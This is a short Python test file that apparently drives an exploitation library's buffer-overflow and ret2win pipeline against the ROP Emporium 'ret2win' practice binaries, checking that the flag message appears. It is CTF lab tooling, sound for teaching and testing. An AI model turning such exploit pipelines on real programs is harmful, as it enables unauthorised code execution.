from .. import *

BIN32 = "./tests/ropemporium/ret2win32"
BIN64 = "./tests/ropemporium/ret2win"


def overwriter(t, data):
    t.sendline(data)
    t.readuntil(b"Thank you!\n")


def test_ret2win32_local(exploit):
    state = exploit(BIN32, process(BIN32))
    state.overwriter = overwriter
    state = Pipeline(bof.corefile, call.custom("ret2win"))(state)
    assert b"Well done! Here's your flag:" in state.target.clean(constants.CLEAN_TIME)


def test_ret2win_local(exploit):
    state = exploit(BIN64, process(BIN64))
    state.overwriter = overwriter
    # align not strictly needed but inreases test line coverage ;)
    state = Pipeline(bof.corefile, call.custom("ret2win", align=True))(state)
    assert b"Well done! Here's your flag:" in state.target.clean(constants.CLEAN_TIME)
